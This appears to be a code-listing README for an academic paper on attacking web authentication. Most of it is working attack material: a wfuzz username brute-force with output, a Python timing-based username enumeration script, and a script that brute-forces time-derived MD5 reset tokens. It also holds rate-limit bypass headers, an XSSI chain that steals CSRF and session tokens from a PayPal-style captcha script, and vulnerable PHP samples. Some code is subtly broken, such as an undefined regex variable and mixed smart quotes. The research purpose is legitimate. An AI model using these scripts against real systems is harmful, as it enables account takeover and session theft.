# ICISPD-47-2023
Code snippets supporting the conference paper with ID - 47, Titled - "Attacking Authentication Mechanisms: from Offense to Defense"

### Listing 1 - Captcha image’s content placed in ‘id’ field 
    <img id=‘7zwf3’ src=‘captchajpg.php’>

### Listing 2 - PHP code vulnerable to X-Forwarded-For attack

    <?php
    // get IP address
    if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) {
	$realip = array_map('trim', explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']))[0];
    } else if (array_key_exists('HTTP_CLIENT_IP', $_SERVER)) {
	$realip = array_map('trim', explode(',', $_SERVER['HTTP_CLIENT_IP']))[0];
    } else if (array_key_exists('REMOTE_ADDR', $_SERVER)) {
	$realip = array_map('trim', explode(',', $_SERVER['REMOTE_ADDR']))[0];
    }
    echo "<div>Your real IP address is: " . htmlspecialchars($realip) . "</div>";
    ?>
 

    
### Listing 3 - Dictionary of headers to bypass the rate-limiting mechanism


    headers = {   
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",  
    "X-Forwarded-For": "1.2.3.4"  
    }    

### Listing 4 - Brute forcing usernames through wfuzz
As we can see, username enumeration confirms that the user ‘admin’ exists on the given website. Thus, the attacker can proceed with the brute-force attack on the user “admin”.
( --hs "Unknown username," where "hs" should be a mnemonic used for string hiding), using a short wordlist from SecLists. Since we are not trying to find a valid password, we do not care about the Password field, so we will use a dummy one.

    root@kali[/nfsu-svnit]# wfuzz -c -z file,/opt/useful/SecLists/Usernames/top-usernames-shortlist.txt -d "Username=FUZZ&Password=dummypass"  
    --hs "Unknown username" http:// vulnerable-website.com/user_unknown.php
    ********************************************************
    * Wfuzz 3.1.0 - The Web Fuzzer                         *
    ********************************************************

    Target: http://vulnerable-website.com/user_unknown.php
    Total requests: 17
    ===================================================================
    ID           Response   Lines    Word     Chars       Payload
    ===================================================================
    000000002:   200        56 L     143 W    1984 Ch     "admin"
    Total time: 0.017432
    Processed Requests: 17
    Filtered Requests: 16

### Listing 5 - PHP code vulnerable to timing attack

    <?php
    $db = mysqli_connect("localhost", "dbuser", "dbpass", "dbname");
    $result = $db->query('SELECT * FROM users WHERE username="'.safesql($_POST['user']).'" AND active=1');
    // $db->query() replies True if there are at least a row (so a user), and False if there are no rows (so no users)
      if ($result) {
    // retrieve a row. don't use this code if multiple rows are expected
      $row = mysqli_fetch_row($result);
    // hash password using custom algorithm
      $cpass = hash_password($_POST['password']);
    // check if received password matches with one stored in the database
      if ($cpass === $row['cpassword']) {
	      echo "Welcome $row['username']";
      } else {
        echo "Invalid credentials.";
      } 
      } else {
        echo "Invalid credentials.";  
      }
    ?>

### Listing 6 - Python script to perform username enumeration 

    def unpack(fline):
      userid = fline
      passwd = 'foobar'
      return userid, passwd

    def do_req(url, userid, passwd, headers):
      data = {"userid": userid, "passwd": passwd, "submit": "submit"}
      res = requests.post(url, headers=headers, data=data)
      print("[+] user {:15} took {}".format(userid, res.elapsed.total_seconds()))
      return res.text

    with open(‘/opt/useful/SecLists/Usernames/top-usernames-shortlist.txt’) as fh:
      for fline in fh:
        if fline.startswith("#"):
          continue
        userid, passwd = unpack(fline.rstrip())
        print("[-] Checking account {} {}".format(userid, passwd))
        res = do_req(‘http://vulnweb.com/login’, userid, passwd, headers)

The above python script sends authentication requests with different usernames to http://vulnweb.com/login and observes the time taken in getting the response from server. If a username exists, then only the PHP code will calculate its hash and will compare it with the one store in database.

### Listing 7 - Finding valid passwords through timing.py in console 
If the hashing algorithm is strong enough, then there will be significant time differences between not-existent username login and existing username login requests.
Given that there could be a network glitch, it is easy to identify "admin" as a valid user because it took way more time than other tested users. If the algorithm used was a fast one, time differences would be smaller, and an attacker could have a false positive because of a network delay or CPU load. However, the attack is still possible by repeating a large number of requests to create a model. While we could assume that a modern application hashes passwords using a robust algorithm to make a potential offline brute force attack as slow as possible, it is possible to infer information even if it uses a fast algorithm like MD5 or SHA1.

    root@kali[/nfsu-svnit]# python3 timing.py /opt/useful/SecLists/Usernames/top-usernames-shortlist.txt
    [+] user root took 0.003
    [+] user admin took 0.263
    [+] user test took 0.005
    [+] user guest took 0.003
    [+] user info took 0.001
    [+] user adm took 0.001
    [+] user mysql took 0.001
    [+] user user took 0.001
    [+] user administrator took 0.001
    [+] user oracle took 0.001
    [+] user ftp took 0.001
    [+] user pi took 0.001
    [+] user puppet took 0.001
    [+] user ansible took 0.001
    [+] user ec2-user took 0.001
    [+] user vagrant took 0.001
    [+] user azureuser took 0.001

### Listing 8 - Using POSIX regular expressions to implement the password policy
    root@kali[/nfsu-svnit]# grep '[[:upper:]]' rockyou.txt | grep '[[:lower:]]' | grep -E '^.{8,12}$'
    416712

### Listing 9 - Logical equivalent of CVE-2016-0783
An attacker that knows a valid username can get the server time by reading the Date header (which is almost always present in the HTTP response).  
The attacker can then brute force the $time value in a matter of seconds and get a valid reset token. In this example, we can see that a common request leaks date and time.
    <?php
      function generate_reset_token($username) {
      $time = intval(microtime(true) * 1000);
      $token = md5($username . $time);
      return $token;
    }

**Attack simulation**  
Consider a web application that generates the token for any user by a similar algorithm to that discussed in Apache OpenMeeting bug[4]. If the token for the user ‘Administrator’ is also created within the interval of plus/minus 1 second from the time the user ‘user2001’ requests the token. The token reset vulnerability arises because of the fact that each token is crafted using the username and the server time at which the token was requested by the user
	The attacker can try various combinations to brute force the reset token for Admin.  

![1](https://github.com/Quadrupl3d/ICISPD-47-2023/assets/134784887/83c3e7d6-bfaa-4286-828b-d7c9f9b63e3e)  
**Fig. 7** Web application generating a reset token for a user based on the server time and username

![image](https://github.com/Quadrupl3d/ICISPD-47-2023/assets/134784887/2cacd2b2-0cb5-44d1-a774-9d2ad6961225)  
**Fig. 8** Response of the web application upon submitting a wrong token

### Listing 10 - Python script to brute force the reset token of Administrator
In 2 seconds, 2000 epoch timestamp in milliseconds will be created. Therefore, the attacker gets 2000 unique md5 tokens within the range of 2 seconds.  

    import threading
    import requests
    from hashlib import md5
    import re
    import time
    
    url = "http://auth-attacks.ctf/question1/"
    start_time = int(time.time()) * 1000
    fail_text = "Wrong token"
    user = "Administrator"
    
    def check_token(x):
        token = user + str(x)
        md5_token = md5(token.encode()).hexdigest()
        raw_data = {
            "token": md5_token,
            "submit": "check"
        }
      print(f"[-] Checking:{md5_token}")
        res = requests.post(url, data=raw_data)
        if fail_text in res.text:
            pass
        else:
            Admin_string_regex = r"Admin\{[^}]*\}"
            Admin_strings = re.findall(htb_string_regex, res.text)
            if Admin_strings:
                print(Admin_strings[0])
            print(f"[*] Congratulations!, found the token:{md5_token}")
            exit()
    
    pre_data = {"submit": "user2001"}
    pre_res = requests.post(url, data=pre_data)
    if "Your token is" in pre_res.text:
    # In 2 seconds, 2000 timestamps in milliseconds will be created
        for x in range(start_time - 1250, start_time + 1250):
            check_token(x)

### Listing 11 - Bruteforcing reset tokens for the user administrator
    root@kali:/nfsu-svnit# python3 test.py 
    [-] Checking:748759b3c4c061a202c8e2b5cf336a10
    [-] Checking:a8b519c8dda963d61967dbd6c1dea46d
    [-] Checking:68eeff2efe3ee575b6a8835d49e696dc
    [-] Checking:7d145324859240916a9509d5fe56e271
    [-] Checking:61dcffdc39364d7b19aa299c4166ae2f
    [-] Checking:1f793d6d1e56a73a19214f49034416b1
    [-] Checking:30f33dfff182943509862e7265366675
    [-] Checking:f4d90c29a3b0a89a7b4c9e6bb78f0442
    [-] Checking:df354ee73fdd9929bf8f76d8214fb976
    <SNIP 2500 md5 tokens>
    [-] Checking:50049bf7d9e8c51a250857f63e6f3266
    [-] Checking:02d1d5b3a8dce6d8a463f80adca523f2
    [-] Checking:7fc5567d9e12e7a24bdb49b237a177de
    [-] Checking:c6fbfd11680d681a0b59ed80fa43aaad
    [-] Checking:34b5735e334f918903535bcb1fdcdfa4
    HTB{uns4f3t0k3ns4r3uns4f3}
    [*] Congratulations! found the token:34b5735e334f918903535bcb1fdcdfa4

### Listing 12 - Session Identifier and csrf token leakage in file recaptchav3.js
At URL _http://vuln-web.com/auth/createchallenge/anything/v3/recaptchav3.js_  

    var _0x48ab = [
    'error','exception','trace','console','style','recaptchaframe', 'state','OPEN','width','271px','74px',  
    'addEventListener','attachEvent', 'message','onclick','click','data','parse','source','adframe','reason',   
    'open','POST','/auth/verifyrecaptcha','Content-Type','setRequestHeader','setRequestHeader','x-requested- with',  
    'XMLHttpRequest','onload','recaptchaToken=','token','&_csrf=', 'nR2LzLJ6M217oRctwOJHWlMduYn5dlUf1NwDA=',  
    '&_sessionID=', 'feBImvs4EBEcp21JnXtYQDPFxnxDTKY','send','createElement','iframe','src','https://www.paypalobjects.com/authchallenge/recaptchav3_v3.html','async','sandbox', 'allow-same- 
    origin\x20allow-scripts\x20allow- popups','position','fixed','bottom','30px','right','1.5px','transition','width\x200.3s\x20ease\x200s','border'];

### Listing 13 - POST Request to /auth/validatecaptcha
    POST /auth/validatecaptcha HTTP/1.1
    Host: www.paypal.com
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US, en;q=0.5 
    deflate Accept-Encoding: gzip, gzip, de
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 670
    Origin: https://www.paypal.com
    DNT: 1
    Connection: close
    Referer: https://www. w.paypal.com/signin
    Cookie:
    Upgrade-Insecure-Requests: 1
    
    _csrf=rugtYQKc0j98rD%2FY2nzHkSAnIgBO%2F%2FvXbCBB043D4  
    &_sessionID=QVkLkLceCX08nqejJZL3hWhjSmZCpdev  
    &jse=4195323cd096aaale5c179b6b31510526  
    &recaptcha=03AOLTBLT9NjQH6B_<SNIP>

### Listing 14 - Response Body from server
    DOCTYPE html><!--[if lt IE 9]><html lang="en" class="no-ja lower-than-ie9"><![endif]--><!--[if lt IE 101><html
    class="no-js"><!--<![endif]--><head><!--Script info: script: node, template: lang="en" class="no-js lower-than-iel0"><![endif]--><!--[if !IE]>-<html lang="en" date: country, language:       web version: content version: hostname: rEJvnqaaQhLn/nWTBcSUjQx898qoYZOK1tAC6KIRPKVESlacFz1F4IdPVORWYHBh8iNp2aBzxMrlogid:
    <SNIP>
    <input type="hidden" name="requestUrl" value="/signin" /><input type="hidden" name="phoneCode" value="US +1"/>
    
    <input type="hidden" name="login email" victim_pwned@gmail.com"/>
    <input type="hidden" name="login_password" value="InJ3cto7">
    
    <SNIP>
    <script data-main="https://www.paypalobjects.com/wel
    w.paypalobjects.com/web/res/ale/abela949b9ed0a0e09719e8375b89/js/config"
    src="https://www.paypalobjects.com/web/res/ale/abela949b9ed0a0e09719e8375b89/js/lib/require.js"></script></html

### Listing 15 - Using XSSI to fetch cross-domain resource
    <script src="paypal.com/auth/createchallenge/anything/recaptchav3.js"></script>
    <script>
    	var csrf;
    	var sessID;
    	for (var i = 0; i < _0x48ab.length; i++) {
    		if (_0x48ab[i] === '&_csrf=' || _0x48ab[i] === '&_sessionID=') {
    			csrf = _0x48ab[i];
    			sessID = _0x48ab[i + 1];
    		}
    	}
    </script>

### Listing 16 - Brute forcing the login form to trigger the security challenge

    <script>
    function sendAuthenticationRequest() {
        var xhr = new XMLHttpRequest();
        var url = 'https://vulnerable-web.com/login';
        var params = 'email=r@gmail.com&password=1234567890&submit=True';
        xhr.open('POST', url, true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4 && xhr.status === 200) {
                console.log('Response:', xhr.responseText);
            }
        };
        xhr.send(params);
    }
	window.onload = function() {
	    		for (var i = 0; i < 5; i++) {
	        	setTimeout(sendAuthenticationRequest, i * 1000);
					//1 Authentication request is sent each second.
	    	}
	};
	</script>
	<form action="https://vulnerable-web.com/login" method="POST">
	<label for="email">Email:</label>
	   <input type="email" id="email" name="email" required><br><br>
	   <label for="password">Password:</label>
	   <input type="password" id="password" name="password" required><br><br>
	   <input type="submit" value="Login">
	</form>

### Listing 17 - attacker.com completing the security challenge
	<script> 
	function complete_security_challenge() {
		var xhr = new XMLHttpRequest();
		var url = 'https://vulnerable-web.com/auth/validatecaptcha';
		var params = '_csrf=' + csrf + '&_sessionID=' + sessID + '&recaptcha=’ + recap + ‘&jse=' + jse;
		xhr.open('POST', url, true);
		xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
		xhr.onreadystatechange = function() {
		if (xhr.readyState === 4 && xhr.status === 200) {
			console.log('Response:', xhr.responseText);
			}
		};
		xhr.send(params);
		}</script>
